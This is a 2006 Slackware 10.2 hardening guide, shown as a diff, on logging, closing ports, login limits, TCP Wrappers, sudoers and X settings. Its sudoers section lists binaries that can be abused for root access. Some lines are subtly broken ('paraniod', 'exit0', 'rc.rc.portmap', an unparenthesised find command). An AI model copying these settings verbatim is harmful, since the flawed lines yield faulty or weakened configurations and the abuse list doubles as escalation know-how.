@@ -1,0 +1,2748 @@
+Slackware System Hardening
+Copyright (c) 2002, 2005, 2006 Jeffrey Denton
+http://www.cochiselinux.org/files/system-hardening-10.2.txt
+
+
+Written by Jeffrey Denton <dentonj@gmail.com>
+2 September 2006
+Version - 0.7.1
+
+
+This is written for:
+
+$ cat /etc/slackware-version
+Slackware 10.2.0
+
+
+This is a list of some of the steps I take to improve the security on my
+Slackware systems.  It is by no means a complete list of everything that is
+possible.  You can either do all of the things listed here, or you can choose
+the ones you feel would help secure your system.
+
+WARNING:    Hardening a system is a compromise between security
+            and usability.  Some of the things I do would adversely
+            affect the usability of your system and may very well
+            break things.  Please have one of the following on hand
+            just in case you lock yourself out of your system:
+
+                Tom's Rootboot - http://www.toms.net/rb/
+
+                The "Live" CD that comes with the official
+                version of Slackware
+
+                The Slackware Install CDs
+
+            You should make a backup of anything that you feel is
+            important, would be hard to replace, or that you simply
+            could not do without BEFORE implementing anything listed
+            here.
+
+            If you don't understand what a setting or configuration
+            is doing, don't use it on your system.
+
+            The contents of this document is only meant to be used
+            on Slackware Linux.
+
+            Some of the settings are redundant (defense in depth) or
+            may conflict.
+
+            You have been warned.
+
+
+Notes:
+        - The settings assume that only one user is on the system, "dentonj",
+          adjust as necessary.
+        - Associated man pages are listed for further information
+        - I will comment this document if I ever get around to it
+        - This is still a draft as there are many TODO items.
+
+
+----[ Keep Current ]----
+
+
+    http://www.slackware.com/security/
+
+    http://www.slackware.com/lists/
+
+    To subscribe to the Slackware Security mailing list, email:
+
+        majordomo@slackware.com
+
+    with the phrase "subscribe slackware-security" in the body of the email.
+
+
+----[ Logging ]----
+
+
+/etc/rc.d/rc.syslog:
+    /usr/sbin/syslogd -m 10 -r -h
+    /usr/sbin/klogd -c 3 -x -p
+
+    root@darkstar:~# /etc/rc.d/rc.syslog restart
+
+    The "-r" options enables the system to receive syslog messages from the
+    remote hosts.  The "-h" option allows syslog to forward messages it
+    receives from remote hosts.  The allows syslog messages to be logged on
+    several systems for redundancy. Syslog messages that are sent over the
+    network are not encrypted and can be easily captured.  Watch out for syslog
+    forwarding loops when using both "-r" and "-h".
+
+    Opens UDP port 514.
+
+    man syslogd
+    man klogd
+
+/etc/syslog.conf
+    # Log everything to a file
+    *.*                         - /var/log/messages
+
+    # Log everything to a tty (Ctrl-Alt-F12)
+    *.*                         /dev/tty12
+
+    # Log everything to a log host
+    *.*                         @192.168.1.2
+
+    # Display emergencies to everyone using wall
+    *.=emerg                    *
+
+    # Send alerts directly to the user's terminals
+    *.=alert                    root,dentonj
+
+    root@darkstar:~# /etc/rc.d/rc.syslog restart
+
+    man syslogd
+    man syslog.conf
+
+/etc/logrotate.conf:
+    weekly
+    rotate 26
+    compress
+
+    Make sure you have enough hard drive space to store 6 months worth of logs.
+    You really should be moving the logs off of the system.
+
+    man logrotate
+
+/etc/logrotate.d/syslog:
+    /var/log/cron /var/log/debug /var/log/maillog /var/log/messages
+    /var/log/secure /var/log/spooler /var/log/sulog /var/log/syslog {
+                create 0640 root root
+                mail dentonj@gmail.com
+                mailfirst
+                sharedscripts
+                postrotate
+                        /bin/kill -HUP `cat /var/run/syslogd.pid \
+                        2> /dev/null || true`
+                endscript
+    }
+
+    man logrotate
+
+/etc/rc.d/rc.S:
+    # Setup the /etc/motd to reflect the current kernel level:
+    # THIS WIPES ANY CHANGES YOU MAKE TO /ETC/MOTD WITH EACH BOOT.
+    # COMMENT THIS OUT IF YOU WANT TO MAKE A CUSTOM VERSION.
+    # echo "$(/bin/uname -sr)." > /etc/motd
+
+    man motd
+
+/etc/motd, /etc/issue.net, /boot/boot_message.txt:
+
+****************************************************************
+
+ Unauthorized access prohibited; all access and activities not
+ explicitly authorized by the administrator are unauthorized.
+ All activities are monitored and logged.  There is no privacy
+ on this system.  Unauthorized access and activities or any
+ criminal activity will be reported to appropriate authorities.
+
+****************************************************************
+
+    Or:
+
+"You seem to be lost.  Please return to your little corner of the Internet."
+
+    root@darkstar:~# lilo -v -p
+
+    If lilo returns an error, try to determine what the problem is and rerun
+    lilo before you reboot the system.  Otherwise, you may end up with a
+    system that doesn't boot properly.
+
+    man issue
+    man motd
+
+/etc/rc.d/rc.local:
+    # Log icmp packets to syslog
+    /usr/sbin/icmpinfo -vvv -s -l
+
+    man icmpinfo
+
+/sbin/accton:
+    Account processing is turned on by /etc/rc.d/rc.M.  However, the log file
+    doesn't exist.
+
+    root@darkstar:~# touch /var/log/pacct
+
+    man ac
+    man 2 acct
+    man 5 acct
+    man accton
+    man sa
+    man lastcomm
+
+/etc/rc.d/rc.M:
+    Increase logging in cron.
+
+    /usr/sbin/crond -l7 >> /var/log/cron 2>&1
+
+    man crond
+
+/var/log/btmp:
+    The btmp log file contains all of the failed login attempts.  The command
+    lastb lists the contents of the log file.
+
+    root@darkstar:~# touch /var/log/btmp
+    root@darkstar:~# chmod --reference=/var/log/wtmp /var/log/btmp
+    root@darkstar:~# chown --reference=/var/log/wtmp /var/log/btmp
+    root@darkstar:~# ln -s /usr/bin/last /usr/bin/lastb
+    root@darkstar:~# lastb
+
+    Users that try to login by entering their password first will end up with
+    it being logged in /var/log/btmp and displayed by lastb.
+
+    man last
+
+
+----[ Disable Daemons/Close Ports ]----
+
+
+/etc/inetd.conf:
+    The following are running by default:
+      time - TCP port 37
+      time - UDP port 37
+      auth - TCP port 113
+      comsat - UDP port 512
+
+    Comment out the lines of the services that you don't need.
+
+    root@darkstar:~# grep -v "^#" /etc/inetd.conf
+
+    man inetd
+    man in.comsat
+    man in.identd
+    man grep
+
+/etc/rc.d/rc.inetd:
+    root@darkstar:~# /etc/rc.d/rc.inetd stop
+    root@darkstar:~# chmod a-x /etc/rc.d/rc.inetd
+
+    man inetd
+    man chmod
+
+/usr/X11R6/bin/startx:
+    defautserverargs="-nolisten tcp"
+
+    Closes TCP port 6000+n, where n is $DISPLAY (the default is 0).
+
+    man Xserver
+
+/etc/X11/xdm/Xservers:
+    :0 local /usr/X11R6/bin/X -nolisten tcp
+
+    Closes TCP port 6000.
+
+    man Xserver
+    man xdm
+
+/etc/X11/xdm/Xaccess:
+    Make sure everything is commented.
+
+    man xdm
+
+/etc/rc.d/rc.4:
+    exec /usr/X11R6/bin/xdm -nodaemon -udpPort 0
+
+    Closes UDP port 177.
+
+    man xdm
+
+/etc/X11/fs/config:
+    use-syslog = yes
+    no-listen = tcp
+
+    Closes TCP port 7100.
+
+    man xfs
+
+/etc/rc.d/rc.inet2:
+    Most of the rc.scripts are started here.  From the script:
+
+        "Uncomment or comment out sections depending on which
+        services you site requires."
+
+    There are two ways to stop daemons and services from being started.  The
+    first way is to make the script starting the daemon or service non-
+    executable:
+
+        chmod 600 /etc/rc.d/rc.bind
+
+    The second way is to comment out the sections of this script that starts
+    the daemon or service:
+
+    Lines 100-103:
+        # Start the BIND name server daemon:
+        # if [ -x /etc/rc.d/rc.bind ]; then
+        #   /etc/rc.d/rc.bind start
+        # fi
+
+    Or you can do both.  Using both methods is redundant.  However, using both
+    methods would keep daemons from accidentally being started at the next
+    reboot if you happen to get sloppy with a chmod command.  Some daemons will
+    not start by default because their configuration files are either not
+    present or not setup properly.
+
+    Comment out the following lines:
+
+    Lines 20 - 53:  Disable mounting of NFS filesystems
+    Lines 58 - 60:  Disable RPC portmapper
+    Lines 63 - 68:  Disable mount of SMB filesystems
+    Lines 90 - 92:  Disable inetd
+    Lines 101 - 103:  Disable BIND
+    Lines 106 - 108:  Disable NIS
+    Lines 115 - 117:  Disable NFS
+
+/etc/rc.d/rc.M:
+    Comment out the following lines:
+
+    Lines 103 - 105:  Disable dnsmasq
+    Lines 108 - 114:  Disable CUPS and lpd
+    Lines 117 - 119:  Disable netatalk
+    Lines 160 - 162:  Disable atd
+    Lines 194 - 196:  Disable saslauthd
+    Lines 199 - 201:  Disable sendmail
+    Lines 205 - 212:  Disable APM and ACPI
+    Lines 230 - 232:  Disable HP Officejet
+    Lines 235 - 237:  Disable MySQL
+    Lines 240 - 242:  Disable Apache
+    Lines 224 - 226:  Disable Samba
+    Lines 234 - 236:  Disable SystemV init scripts
+
+/etc/rc.d/rc.S:
+    Comment out the following lines:
+
+    Lines 16 - 22:  Disable hotplug
+    Lines 39 - 43:  Disable udev
+    Lines 192 - 196:  Disable isapnp
+    Lines 292 - 294:  Disable SystemV init scripts
+
+/etc/rc.d/rc.acpid:
+    Advanced Configuration and Power Interface event daemon
+
+    root@darkstar:~# /etc/rc.d/rc.acpid stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.acpid
+
+    This daemon doesn't open any ports.
+
+/etc/rc.d/rc.alsa:
+    Advanced Linux Sound Architecture
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.alsa
+
+    This daemon doesn't open any ports.
+
+/etc/rc.d/rc.atalk:
+    AppleTalk
+
+    root@darkstar:~# /etc/rc.d/rc.atalk stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.atalk
+
+    Closes TCP port 548.
+
+/etc/rc.d/rc.bind:
+    BIND
+
+    root@darkstar:~# /etc/rc.d/rc.bind stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.bind
+
+    Closes TCP ports 53 and 953.
+    Closes UDP ports 53 and 32768.
+
+/etc/rc.d/rc.cups:
+    Common UNIX Printing System
+
+    root@darkstar:~# /etc/rc.d/rc.cups stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.cups
+
+    Closes TCP and UDP port 631.
+
+/etc/rc.d/rc.dnsmasq:
+    A lightweight DHCP and caching DNS server
+
+    root@darkstar:~# /etc/rc.d/rc.dnsmasq stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.dnsmasq
+
+    Closes TCP and UDP port 53.
+
+/etc/rc.d/rc.gpm:
+    General Purpose Mouse
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.gpm
+
+    This daemon doesn't open any ports.
+
+/etc/rc.d/rc.hotplug:
+    Linux hotplugging support scripts
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.hotplug
+
+    This daemon doesn't open any ports.
+
+/etc/rc.d/rc.httpd:
+    Apache webserver
+
+    root@darkstar:~# /etc/rc.d/rc.httpd stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.httpd
+
+    Closes TCP port 80.
+
+/etc/rc.d/rc.inet1:
+    Configures network interfaces
+
+    Make any changes in /etc/rc.d/rc.inet1.conf.
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.inet1
+
+/etc/rc.d/rc.inetd:
+    The Internet daemon
+
+    root@darkstar:~# /etc/rc.d/rc.inetd stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.inetd
+
+    Closes TCP ports 37 and 113 (by default).
+    Closes UDP ports 37 and 512 (be default).
+
+/etc/rc.d/rc.mysqld:
+    The MySQL server daemon
+
+    By default, mysqld will not start.  Read the /etc/rc.d/rc.mysqld file for
+    details on how to start the daemon.
+
+    The script prevents incoming network connections by default with the
+    "--skip-networking" option.  If this option is commented out, TCP port
+    3306 will be opened.
+
+    This daemon doesn't open any ports by default.
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.mysqld
+
+/etc/rc.d/rc.nfsd:
+    The kfnsd NFS daemon
+
+    By default, the deamon will not start because the file /etc/exports is not
+    configured properly.
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.nfsd
+
+/etc/rc.d/rc.portmap:
+    The RPC portmapper
+
+    This script is started by /etc/rc.d/rc.nfsd.  Since the file /etc/exports
+    is not configured properly by default, this damon will not start.
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.rc.portmap
+
+/etc/rc.d/rc.samba:
+    The Samba SMB file/print server
+
+    By default, the daemon will not start because the file /etc/samba/smb.conf
+    is not present.
+
+    root@darkstar:~# chmod go-rwx /etc/rc.d/rc.samba
+
+/etc/rc.d/rc.saslauthd:
+    Some plaintext authentication thingy.
+
+    root@darkstar:~# /etc/rc.d/rc.saslauthd stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.saslauthd
+
+/etc/rc.d/rc.sendmail:
+    Sendmail
+
+    root@darkstar:~# /etc/rc.d/rc.sendmail stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.sendmail
+
+    Closes TCP ports 25 and 587.
+
+/etc/rc.d/rc.sshd:
+    The Secure Shell Server
+
+    root@darkstar:~# /etc/rc.d/rc.sshd stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.sshd
+
+    Closes TCP port 22.
+
+/etc/rc.d/rc.syslog:
+    The system logging daemon
+
+    If the "-r" option is used, UDP port 514 is opened.
+
+    This daemon doesn't open any ports by default.
+
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.syslog
+
+/etc/rc.d/rc.sysvinit:
+    "This file provides basic compatibility with SystemV style startup
+    scripts."
+
+    Unless you have installed a daemon that requires the use of SystemV
+    style startup scripts, there is no need for it to be executable.
+
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.sysvinit
+
+/etc/rc.d/rc.udev:
+    "udev provides a dynamic device directory containing only the files for
+    actually present devices.  It creates and removes device node files
+    usually located in the /dev directory."
+
+    This is part of the hotplug subsystem.
+
+    This daemon doesn't open any ports.
+
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.udev
+
+    man udev
+
+/etc/rc.d/rc.wireless.conf:
+    This file holds the configuration settings used by /etc/rc.d/rc.wireless.
+    The file may hold encryption keys in plain text.  Make sure that users
+    are not able read this file (the default setting).
+
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.wireless.conf
+
+/etc/rc.d/rc.yp:
+    The Network Information Service
+
+    The contents of this file is commented out by default.
+
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.yp
+
+
+----[ Limit Access ]----
+
+
+/etc/rc.d/rc.M:
+    chmod 1733 /tmp /var/tmp
+
+    Prevents users for looking at the contents of those directories.  It still
+    allows them to create, access, and modify files in those directories if
+    they know the actual file name.  This does not stop users from running
+    executables in /tmp.
+
+    dentonj@darkstar:~$ ls -ld /tmp
+    drwx-wx-wt  5 root root 4096 2001-06-27 12:54 /tmp/
+    dentonj@darkstar:~$ cp /bin/date /tmp/test
+    dentonj@darkstar:~$ /tmp/test
+    Thu Jun 27 12:55:00 MST 2001
+    dentonj@darkstar:~$ ls /tmp
+    ls: /tmp: Permission denied
+
+    man chmod
+
+/etc/rc.d/rc.S:
+    chmod 1733 /tmp/.ICE-unix
+    chmod 1733 /tmp/.X11-unix
+
+    Don't let everyone have read access to utmp:
+
+    chmod 660 /var/run/utmp
+
+    man utmp
+    man chmod
+
+/etc/lilo.conf:
+    # mandatory - enter a password with every boot
+    # restricted - enter a password only when a boot time parameter
+    # is used (e.g. - "linux single")
+    # Pick one
+    mandatory
+    #restricted
+
+    # Use the "-p" option with the lilo command to store the hashed password
+    # in a separate file
+    password=""
+
+    prompt
+    timeout=0
+    menu-title="Unauthorized Access Prohibited"
+    message=/boot/boot_message.txt
+    serial=0,9600n8
+
+    root@darkstar:~# lilo -v -p
+    root@darkstar:~# chmod go-rwx /etc/lilo.conf
+
+    Using the setting 'password=""' and then the '-p' option with lilo will
+    prompt you to enter a pass phrase while lilo is running.  The pass phrase
+    is hashed and stored in /etc/lilo.conf.shs.  The man page for lilo claims
+    that the hashed pass phrase is stored in /etc/lilo.conf.crc.  Either way,
+    it's better than having the password listed in /etc/lilo.conf in plain
+    text.  The configuration options above will require the password to be
+    entered whenever the system boots.  You may not want to use the "mandatory"
+    setting if uptime is important or when you normally only access the system
+    remotely.  In these cases, use "restricted" instead.
+
+    man lilo
+    man lilo.conf
+
+/etc/login.access:
+    +:root dentonj:LOCAL
+    -:ALL:ALL
+
+    Only root and dentonj can login locally.  This does not affect logging in
+    via ssh.
+
+    Error generated:  "Login incorrect"
+
+    man login.access
+
+/etc/login.defs:
+    FAIL_DELAY                  20
+    DIALUPS_CHECK_ENAB          no
+    LOG_UNKFAIL_ENAB            yes
+    LOG_OK_LOGINS               yes
+    SULOG_FILE                  /var/log/sulog
+    ISSUE_FILE                  /etc/issue
+    #HUSHLOGIN_FILE
+    PASS_MAX_DAYS               90
+    PASS_MIN_LEN                12
+    CHFN_RESTRICT               frwh
+    DEFAULT_HOME                no
+    #ENVIRON_FILE
+    #NO_PASSWORD_CONSOLE        null
+    GETPASS_ASTERISKS           5
+
+    root@darkstar:~# touch /var/log/sulog
+
+    man login.defs
+    man dpasswd
+
+/etc/suauth:
+    ALL:ALL EXCEPT dentonj:DENY
+
+        Or:
+
+    ALL:ALL EXCEPT GROUP wheel:DENY
+
+
+    root@darkstar:~# usermod -g users -G wheel dentonj
+    root@darkstar:~# chmod go-rwx /etc/suauth
+
+    Only dentonj is allowed to switch users.  Or, only members of the wheel
+    group can switch users.
+
+    Error generated:  "Access to su to that account DENIED."
+                      "You are not authorized to su root"
+
+    man suauth
+
+/etc/porttime:
+    tty1,tty2,tty3,tty4,tty5,tty6:root,dentonj:Al0000-2400
+    *:*:
+
+    root@darkstar:~# chmod go-rwx /etc/porttime
+
+    The third field specifies when someone can login.  If the field is empty,
+    then the user is not able to login.  The "*:*:" entry is a default deny
+    rule to catch everyone not already listed.  The third field lists the times
+    that a user is allowed to login.  If that field is empty, the user is not
+    allowed to login.
+
+    The daemon logoutd is normally run to enforce the login time restrictions
+    listed in /etc/porttime.
+
+    Error generated:  "Invalid login time"
+
+    man porttime
+
+/etc/rc.d/rc.local:
+    # Enforce login time restrictions set in /etc/porttime
+    if [ -x /usr/sbin/logoutd ]; then
+        /usr/sbin/logoutd
+    fi
+
+    man logoutd
+
+/etc/limits:
+    dentonj C0L1
+    * L0
+
+    root@darkstar:~# chmod go-rwx /etc/limits
+
+    The setting "* L0" is a default rule for anyone not previously listed.  The
+    number of logins permitted is set to zero, which means anyone not
+    previously listed is not allowed to login.  This does not affect root.
+
+    Error generated: "Too many logins."
+
+    man limits
+
+/etc/shells:
+    Allowing users to run different shells allows them to bypass any security
+    restrictions set on their login shell.
+
+    Delete the following:
+        /bin/ash
+        /bin/csh
+        /bin/ksh
+        /bin/tcsh
+        /bin/zsh
+
+    root@darkstar:~# removepkg ash
+    root@darkstar:~# removepkg ksh93
+    root@darkstar:~# removepkg tcsh
+    root@darkstar:~# removepkg zsh
+
+    man shells
+
+/usr/sbin/faillog:
+    root@darkstar:~# faillog -u dentonj -m 10
+    root@darkstar:~# faillog -a
+
+    Don't set faillog for root.  This is one of the few settings that can
+    actually stop root from logging in.  Using faillog can cause a denial of
+    service if the maximum number of logins is reached.  Use faillog with
+    caution.
+
+    Error generated:  "Login incorrect"
+
+    man faillog
+
+/etc/passwd:
+    Delete unused accounts.
+
+    root@darkstar:~# find / -user adm -ls
+    root@darkstar:~# userdel adm
+
+    Repeat for the following:
+        adm
+        games
+        gdm
+        lp
+        news
+        operator
+        pop
+        rpc
+        uucp
+
+    The accounts "halt" and "shutdown" don't work by default.  The account
+    "sync" isn't needed.
+
+        root@darkstar:~# su halt
+        halt: must be superuser.
+        root@darkstar:~# su shutdown
+        shutdown: you must be root to do that!
+        root@darkstar:~# userdel halt
+        root@darkstar:~# userdel shutdown
+        root@darkstar:~# userdel sync
+
+    Add /bin/false as the shell to the following:
+        bin:x:1:1:bin:/bin:/bin/false
+        daemon:x:2:2:daemon:/sbin:/bin/false
+        mail:x:8:12:mail:/:/bin/false
+        ftp:x:14:50::/home/ftp:/bin/false
+        smmsp:x:25:25:smmsp:/var/spool/clientmqueue:/bin/false
+        sshd:x:33:33:sshd:/:/bin/false
+        nobody:x:99:99:nobody:/:/bin/false
+
+    Error generated:  darkstar login: test
+                      Password: *************************
+                      Linux 2.4.32
+                      Last login: Wed Jun 27 20:23:42 -0700 2001 on tty2
+                      No mail.
+
+                      Welcome to Linux 2.4.32 (tty2)
+
+                      darkstar login:
+
+    Password aging:
+        Note:  Don't use this if you like to make the /etc/passwd and the
+        /etc/shadow files immutable (chattr +i ...).  It gets ugly...  If you
+        let the password expire, you will not be able to login until you reset
+        the password.  But if the /etc/shadow file is immutable and cannot be
+        changed, then you will not be able to login.  To fix the problem, you
+        would have to boot tomsrtbt or a Linux boot CD, mount the hard drive
+        partition where /etc is located, and remove the immutable attribute
+        from /mnt/etc/shadow (chattr -i ...).
+
+        root@darkstar:~# passwd -x 90 -w 7 root
+        root@darkstar:~# passwd -x 90 -w 7 -i 30 dentonj
+
+    root@darkstar:~# for i in `cat /etc/passwd | awk -F: '{print $1}'`; do
+    > passwd -S $i
+    > done
+    root@darkstar:~# pwck
+
+    man 1 passwd
+    man 5 passwd
+    man find
+    man userdel
+    man false
+    man pwck
+
+/etc/group:
+    root@darkstar:~# find / -group adm -ls
+    root@darkstar:~# groupdel adm
+
+    Repeat for the following:
+        adm
+        lp
+        news
+        pop
+        uucp
+
+    root@darkstar:~# grpck
+
+    Removing accounts may create a long list of files that no longer belong to
+    any user or group.  If you are interested what the files are:
+
+    root@darkstar:~# find / -nouser -o -nogroup -ls > unowned.out
+
+    To change the ownership of the files:
+
+    root@darkstar:~# find / -nouser -o -nogroup -exec chown root.root {} \;
+
+    man group
+    man find
+    man groupdel
+    man grpck
+    man chown
+
+/etc/sudoers:
+    Defaults    rootpw
+    Defaults    ! root_sudo
+    Defaults    ignore_dot
+    Defaults    tty_tickets
+    Defaults    requiretty
+    Defaults    path_info
+    Defaults    noexec
+    %wheel      ALL=(ALL)       ALL
+
+    root@darkstar:~# groups dentonj
+    root@darkstar:~# usermod -g users -G wheel dentonj
+
+    There are a number a security concerns when allowing users to use sudo.
+    Make sure you completely read the man pages for sudo and sudoers.
+
+    There are generally two approaches when configuring sudo.  The first is to
+    allow the user to run any command.  This is essentially giving them su
+    access to root.  If you are going to use the first approach, you should
+    require the user to enter the root password every time they use sudo.
+    Two passwords would need to be entered to gain root access.
+
+    The second approach is to configuring sudo is to only allow a limited
+    number of commands to be run.  If you are going to use the second approach,
+    there are a few commands that you don't want to allow the user to run.
+    These commands can be abused to give the user full access to the system.
+    Make sure you don't add the following or those listed in the Shell Escapes
+    section below to the /etc/sudoers file:
+
+        /bin/cat
+        /bin/chmod
+        /bin/chown
+        /bin/cpio
+        /bin/mount
+        /bin/rpm
+        /bin/tar
+        /sbin/installpkg
+        /usr/bin/env
+        /usr/sbin/useradd
+        /usr/sbin/usermod
+
+    This list should be much longer.
+
+    man sudo
+    man sudoers
+    man visudo
+    man groups
+    man usermod
+
+/etc/ftpusers:
+    This file is used to deny anyone listed from being able to log into the
+    local ftp server.  Add the following:
+        bin
+        daemon
+        mail
+        smmsp
+        mysql
+        sshd
+        nobody
+
+    Add all system accounts that are present in /etc/passwd.
+
+    man ftpusers
+
+/etc/host.conf:
+    nospoof on
+    spoofalert on
+    spoof warn
+
+    man host.conf
+
+/etc/hosts.allow:
+    TCP Wrappers
+
+    all:local:banners /etc/banners:allow
+    sshd:192.168.1.:banners /etc/banners:allow
+    sendmail:all:banners /etc/banners:allow
+    all:paraniod:spawn /usr/bin/logger "%d deny paraniod %c %p %a %h %u" \
+        :banners /etc/banners:deny
+    all:all:spawn /usr/bin/logger "%d deny %c %p %a %h %u" \
+        :banners /etc/banners:deny
+
+    From `man hosts_options`:
+        banners /some/directory
+               Look for a file in `/some/directory` with the same
+               name as the daemon process (for example  in.telnetd
+               for  the  telnet service), and copy its contents to
+               the client.
+
+    If you are using any of the services listed below, make sure you add an
+    allow rule for it.  If you want a different banner for a particular
+    service, delete the symlink and create a text file with the same name.
+
+    root@darkstar:~# mkdir /etc/banners && cd /etc/banners
+    root@darkstar:/etc/banners# ln -s ../issue.net afpd
+    root@darkstar:/etc/banners# ln -s ../issue.net imapd
+    root@darkstar:/etc/banners# ln -s ../issue.net in.identd
+    root@darkstar:/etc/banners# ln -s ../issue.net in.rexecd
+    root@darkstar:/etc/banners# ln -s ../issue.net in.rlogind
+    root@darkstar:/etc/banners# ln -s ../issue.net in.rshd
+    root@darkstar:/etc/banners# ln -s ../issue.net in.telnetd
+    root@darkstar:/etc/banners# ln -s ../issue.net popa3d
+    root@darkstar:/etc/banners# ln -s ../issue.net proftpd
+    root@darkstar:/etc/banners# ln -s ../issue.net sendmail
+    root@darkstar:/etc/banners# ln -s ../issue.net sshd
+    root@darkstar:/etc/banners# ln -s ../issue.net stunnel
+    root@darkstar:/etc/banners# ln -s ../issue.net vsftpd
+
+    A command that can be used to determine which daemons use TCP Wrappers:
+
+    root@darkstar:~# cd /usr/sbin; for i in `ls | grep -v "@$"`; do \
+        echo "   $i"; strings $i | grep hosts.allow; done | less
+
+    To test the /etc/hosts.allow settings:
+
+    root@darkstar:~# tcpdchk
+    root@darkstar:~# tcpdmatch sshd localhost
+    root@darkstar:~# tcpdmatch sshd 1.1.1.1
+    root@darkstar:~# tcpdmatch sshd 192.168.1.1
+
+    man tcpd
+    man 5 hosts_access
+    man hosts_options
+    man tcpdchk
+    man tcpdmatch
+
+/etc/hosts.deny:
+    The only time this file will match is when /etc/hosts.allow is
+    misconfigured.
+
+    all:all:spawn /usr/bin/logger "Check hosts.allow - %d deny %c %p %a %h %u" \
+        :banners /etc/banners:deny
+
+    man tcpd
+    man 5 hosts_access
+    man hosts_options
+
+xdm:
+    Modify xdm-config and create Xstartup and Xreset so that entries can be
+    added to utmp and wtmp when a user logs in.
+
+    man xdm
+
+/etc/X11/xdm/xdm-config:
+    DisplayManager._0.startup:   /usr/X11R6/lib/X11/xdm/Xstartup
+    DisplayManager._0.reset:     /usr/X11R6/lib/X11/xdm/Xreset
+    DisplayManager*authorize:    true
+    DisplayManager*authName:     XDM-AUTHORIZATION-1 MIT-MAGIC-COOKIE-1
+    DisplayManager.requestPort:  0
+
+    man xdm
+
+/etc/X11/xdm/Xstartup:
+    #!/bin/sh
+    #
+    # Xstartup
+    # This program is run as root after the user is verified
+    #
+    # man xdm
+    #
+    if [ -f /etc/nologin ]; then
+        xmessage -file /etc/nologin -timeout 30 -center
+        exit 1
+    fi
+    sessreg -a -l $DISPLAY -x /usr/X11R6/lib/X11/xdm/Xserver $LOGNAME
+    /usr/X11R6/lib/X11/xdm/GiveConsole
+    exit 0
+
+    root@darkstar:~# chmod a+x /etc/X11/xdm/Xstartup
+
+/etc/X11/xdm/Xreset:
+    #!/bin/sh
+    #
+    # Xreset
+    #
+    # This program is run as root after the session ends
+    #
+    # man xdm
+    #
+    sessreg -d -l $DISPLAY -x /usr/X11R6/lib/X11/xdm/Xservers $LOGNAME
+    /usr/X11R6/lib/X11/xdm/TakeConsole
+    exit0
+
+    root@darkstar:~# chmod a+x /etc/X11/xdm/Xreset
+
+/etc/X11/xdm/Xresources:
+    xlogin*greeting:            Unauthorized Access Prohibited
+    xlogin*allowRootLogin:      false
+    xlogin*allowNullPasswd:     false
+
+    man xdm
+
+/etc/X11/xserver/SecurityPolicy:
+    Comment the following lines:
+
+    # If you are using Motif, you probably want these.
+    #property _MOTIF_DEFAULT_BINDINGS   root    ar iw
+    #property _MOTIF_DRAG_WINDOW        root    ar iw
+    #property _MOTIF_DRAG_TARGETS       any     ar iw
+    #property _MOTIF_DRAG_ATOMS         any     ar iw
+    #property _MOTIF_DRAG_ATOM_PAIRS    any     ar iw
+
+    # If you are running CDE you also need these
+    #property _MOTIF_WM_INFO         root    arw
+    #property TT_SESSION             root    irw
+    #property WM_ICON_SIZE           root    irw
+    #property "SDT Pixel Set"        any     irw
+
+    # The next two rules let xwininfo -tree work when untrusted.
+    #property WM_NAME        any     ar
+
+    # Allow read of WM_CLASS, but only for windows with WM_NAME.
+    # This might be more restrictive than necessary, but demonstrates
+    # the <required property> facility, and is also an attempt to
+    # say "top level windows only."
+    #property WM_CLASS       WM_NAME ar
+
+    # These next three let xlsclients work untrusted.  Think carefully
+    # before including these; giving away the client machine name and command
+    # may be exposing too much.
+    #property WM_STATE                  WM_NAME ar
+    #property WM_CLIENT_MACHINE         WM_NAME ar
+    #property WM_COMMAND                WM_NAME ar
+
+    # To let untrusted clients use the standard colormaps created by
+    # xstdcmap, include these lines.
+    #property RGB_DEFAULT_MAP   root    ar
+    #property RGB_BEST_MAP      root    ar
+    #property RGB_RED_MAP       root    ar
+    #property RGB_GREEN_MAP     root    ar
+    #property RGB_BLUE_MAP      root    ar
+    #property RGB_GRAY_MAP      root    ar
+
+    # To let untrusted clients use the color management database created
+    # by xcmsdb, include these lines.
+    #property XDCCC_LINEAR_RGB_CORRECTION       root    ar
+    #property XDCCC_LINEAR_RGB_MATRICES         root    ar
+    #property XDCCC_GRAY_SCREENWHITEPOINT       root    ar
+    #property XDCCC_GRAY_CORRECTION             root    ar
+
+    # To let untrusted clients use the overlay visuals that many vendors
+    # support, include this line.
+    #property SERVER_OVERLAY_VISUALS    root    ar
+
+    man Xserver
+
+xhost:
+    dentonj@darkstar:~$ xhost
+    access control enabled, only authorized clients can connect
+    dentonj@darkstar:~$
+
+    If the following line shows up:
+    INET:localhost
+
+    dentonj@darkstar:~$ xhost -localhost
+
+    man xhost
+    man Xsecurity
+
+/opt/kde/share/config/kdm/kdmrc:
+    [Xdmcp]
+    Enable=false
+    Port=0
+    Willing=
+
+    [X-*-Core]
+    AllowRootLogin=false
+    AllowNullPasswd=false
+    AllowShutdown=Root
+    AllowSdForceNow=Root
+    UseSessReg=true
+
+    [X-:*-Core]
+    ServerArgsLocal=-nolisten tcp
+    AllowNullPasswd=false
+    AllowShutdown=Root
+    NoPassEnable=false
+    #NoPassUsers=
+
+    [X-:0-Core]
+    AutoLoginEnable=false
+    #AutoLoginUser=
+    #AutoLoginPass=
+
+    less /opt/kde/share/doc/kdm/README
+
+/opt/kde/share/config/kdm/Xstartup:
+    Uncomment the following lines:
+
+    chown $USER /dev/console
+    exec sessreg -a -l $DISPLAY -h "`echo $DISPLAY | cut -d: -f1`" $USER
+
+/opt/kde/share/config/kdm/Xreset:
